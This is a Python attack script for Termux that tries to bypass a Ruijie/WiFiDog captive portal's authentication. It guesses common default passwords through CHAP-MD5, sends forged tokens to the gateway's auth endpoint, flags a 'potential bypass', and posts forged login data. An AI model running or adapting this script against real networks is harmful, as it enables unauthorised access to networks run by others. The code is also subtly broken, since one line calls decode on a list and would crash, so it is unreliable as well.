#!/usr/bin/env python3
"""
Ruijie Portal Scanner v2 - Dumps full HTML, properly parses CHAP, tests auth.
Run on Termux while connected to the Ruijie WiFi.
"""
import base64, hashlib, json, os, re, sys, time, urllib.parse
from datetime import datetime
import requests, urllib3
urllib3.disable_warnings()

LOG = []
def log(m):
    print(m); LOG.append(m)

RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()
sess = requests.Session()
sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
sess.verify = False

log("=" * 60)
log("RUIJIE SCANNER v2")
log(f"Time: {datetime.now()}")
log("=" * 60)

# Step 1: Detect portal
log("\n[1] FETCHING PORTAL PAGE HTML...")
try:
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204",
                 allow_redirects=True, timeout=10)
    portal_url = r.url
    log(f"Portal URL: {portal_url}")
    log(f"Status: {r.status_code}")
    log(f"Content-Length: {len(r.text)}")
    log(f"--- FULL HTML ({len(r.text)} bytes) ---")
    log(r.text)
    log("--- END HTML ---")
except Exception as e:
    log(f"Error: {e}")

# Step 2: Parse URL params
parsed = urllib.parse.urlparse(portal_url)
params = urllib.parse.parse_qs(parsed.query)
gw_addr = params.get("gw_address", [b"192.168.10.1".decode()])[0]
gw_port = params.get("gw_port", [b"2060".decode()])[0]
mac = params.get("mac", [b""].decode())[0]

# Step 3: Properly parse CHAP challenge bytes
log("\n[2] CHAP CHALLENGE PARSING...")
chap_id_raw = params.get("chap_id", [""])[0]
chap_chal_raw = params.get("chap_challenge", [""])[0]
log(f"chap_id raw repr: {repr(chap_id_raw)}")
log(f"chap_challenge raw repr: {repr(chap_chal_raw)}")

def parse_octal(s):
    """Parse \ddd octal escapes into raw bytes."""
    result = bytearray()
    i = 0
    while i < len(s):
        if s[i] == '\\' and i+3 < len(s) and s[i+1:i+4].isdigit():
            result.append(int(s[i+1:i+4], 8))
            i += 4
        else:
            result.append(ord(s[i]))
            i += 1
    return bytes(result)

chap_id_bytes = parse_octal(chap_id_raw)
chap_chal_bytes = parse_octal(chap_chal_raw)
log(f"chap_id bytes ({len(chap_id_bytes)}): {chap_id_bytes.hex()}")
log(f"chap_challenge bytes ({len(chap_chal_bytes)}): {chap_chal_bytes.hex()}")

# Step 4: Compute CHAP-MD5 for common passwords
log("\n[3] CHAP-MD5 COMPUTATION...")
if chap_id_bytes and chap_chal_bytes:
    for pwd in ["123456", "000000", "888888", "guest", "admin", ""]:
        h = hashlib.md5(chap_id_bytes + pwd.encode() + chap_chal_bytes).hexdigest()
        log(f"  md5({pwd:>8}): {h}")

# Step 5: Test direct gateway auth with CHAP token
log("\n[4] TESTING GATEWAY AUTH...")
token_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token=test"
try:
    r = sess.get(token_url, timeout=5, allow_redirects=False)
    log(f"  token=test: {r.status_code} -> {r.headers.get('Location','')[:120]}")
except Exception as e:
    log(f"  token=test: error {e}")

# Compute a chap_md5 response and try it as token
if chap_id_bytes and chap_chal_bytes:
    chap_resp = hashlib.md5(chap_id_bytes + b"123456" + chap_chal_bytes).hexdigest()
    token_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={chap_resp}"
    try:
        r = sess.get(token_url, timeout=5, allow_redirects=False)
        loc = r.headers.get('Location','')[:120]
        log(f"  token=chap_md5: {r.status_code} -> {loc}")
        if "denied" not in loc.lower():
            log("  *** NOT DENIED! Potential bypass! ***")
    except Exception as e:
        log(f"  token=chap_md5: error {e}")

# Step 6: Try direct POST to portal auth endpoint
log("\n[5] TRYING PORTAL AUTH ENDPOINTS...")
host = f"{parsed.scheme}://{parsed.netloc}"

# Common Ruijie wifidogAuth endpoints
for endpoint in ["/auth/wifidogAuth/login/", "/auth/wifidogAuth/portal/",
                 "/api/auth/voucher/", "/api/auth/login/"]:
    url = f"{host}{endpoint}"
    try:
        r = sess.get(url, timeout=5)
        log(f"  GET {endpoint}: {r.status_code} ({len(r.text)} bytes)")
    except Exception as e:
        log(f"  GET {endpoint}: error {e}")

# Step 7: Try CHAP-MD5 POST to the login URL
log("\n[6] CHAP-MD5 POST TO LOGIN...")
if chap_id_bytes and chap_chal_bytes:
    chap_pwd = hashlib.md5(chap_id_bytes + b"123456" + chap_chal_bytes).hexdigest()
    data = {
        "gw_id": params.get("gw_id", [""])[0],
        "gw_address": gw_addr,
        "gw_port": gw_port,
        "mac": mac,
        "chap_id": chap_id_raw,
        "chap_challenge": chap_chal_raw,
        "chap_password": chap_pwd,
        "ip": params.get("ip", [""])[0],
        "ssid": params.get("ssid", [""])[0],
    }
    login_url = f"{host}/auth/wifidogAuth/login/"
    log(f"  Posting to {login_url}")
    log(f"  Data: {json.dumps(data, indent=2)}")
    try:
        r = sess.post(login_url, data=data, timeout=10, allow_redirects=False)
        log(f"  Status: {r.status_code}")
        log(f"  Location: {r.headers.get('Location','')[:200]}")
        log(f"  Body: {r.text[:500]}")
    except Exception as e:
        log(f"  Error: {e}")

# Step 8: Check gateway directly
log("\n[7] GATEWAY DIRECT CONNECTION TEST...")
for path in ["/", "/wifidog/auth", "/wifidog/portal"]:
    url = f"http://{gw_addr}:{gw_port}{path}"
    try:
        r = sess.get(url, timeout=5)
        log(f"  {url}: {r.status_code} ({len(r.text)} bytes)")
        if len(r.text) < 2000:
            log(f"    Body: {r.text[:300]}")
    except Exception as e:
        log(f"  {url}: error {e}")

# Save
fname = f"portal_scan2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
with open(fname, "w") as f:
    f.write("\n".join(LOG))
log(f"\n[+] Saved to {fname}")
